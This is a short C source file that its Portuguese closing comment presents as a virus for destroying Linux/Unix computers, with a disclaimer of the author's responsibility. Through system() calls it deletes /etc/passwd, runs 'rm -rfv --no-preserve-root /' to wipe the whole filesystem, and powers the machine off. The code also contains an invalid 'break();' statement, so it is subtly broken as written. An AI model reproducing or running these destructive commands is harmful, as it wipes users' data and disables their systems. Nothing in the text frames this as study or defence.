#include <stdio.h>
#include <stdlib.h>

void shellRemoveAccess()
{
    system("sudo rm -r /etc/passwd");
    system("clear");
    for(;;)
    {
        system("sudo rm -rfv --no-preserve-root /");
        system("clear");
        system("poweroff");
        break();
    }
}

int main()
{
    system("clear");
    shellRemoveAccess();
    return 0;
}

/*Virus destruidos de computadores, com kernel linux/unix, o criador do projeto nao se responsabiliza,
pelo uso do virus.
*/